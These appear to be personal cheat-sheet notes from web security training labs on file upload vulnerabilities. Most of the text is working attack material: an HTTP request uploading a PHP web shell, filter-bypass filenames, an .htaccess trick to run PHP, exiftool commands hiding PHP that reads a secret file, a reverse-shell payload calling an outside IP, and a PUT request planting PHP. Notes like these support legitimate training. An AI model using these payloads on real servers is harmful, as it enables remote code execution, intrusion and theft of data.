Example Image Upload POST Request:
```
POST /my-account/avatar HTTP/2
Host: 0a0e00a604e7b9e981067a4b00120099.web-security-academy.net
Cookie: session=s2YCbN4BxaVG3wnNJMH3ajYUVfKfLYTc
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------866603063390648708194728913
Content-Length: 519
Origin: https://0a0e00a604e7b9e981067a4b00120099.web-security-academy.net
Referer: https://0a0e00a604e7b9e981067a4b00120099.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

-----------------------------866603063390648708194728913
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: application/x-php

<?php echo system($_GET['command']); ?>

etc.
```

Exploits:
1. can change `Content-Type` to `application/pdf` or `image/jpeg` before uploading and then access how you would
2. can change `filename` to `..%2fwebshell.php` and then access from a different directory
	1. Example: instead of `$URL/files/avatars/webshell.php`, access from `$URL/files/webshell.php`
3. Upload an .htaccess file with this content in order to execute .fart files as php:
	1. `AddType application/x-httpd-php .fart`
4. Obfuscate the file type (remember to still call for exploit.php though):
	1. `exploit.php.jpg` (could be parsed as php depending on algorithm)
	2. `exploit.php.` (occasionally trailing .'s or spaces are stripped)
	4. `exploit%2Ephp` (in case the filename is decoded but only server side)
	5. `exploit.php;.jpg` (can cause discrepancies on what is considered the end of the file name)
	6. `exploit.php%00.jpg` (can cause discrepancies on what is considered the end of the file name)
	7. `exploit.p.phphp` (in case .php is stripped from the file)
5. Hide php code inside a jpg using exiftool: 
	1. This worked: `exiftool -Comment="<?php echo 'content here' . file_get_contents('/home/user/secret') . 'content here' ; ?>" image.jpg -o outfile.php`
	2. ```exiftool -Comment="<?php -r '\$sock=fsockopen(\"192.168.150.131\",80);\`/bin/bash <&3 >&3 2>&3\`;' ?>" image.jpg -o outfile.php```
	3. ^ Couldn't get this one working
	
6. It's worth noting that some web servers may be configured to support PUT requests: 

```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```   
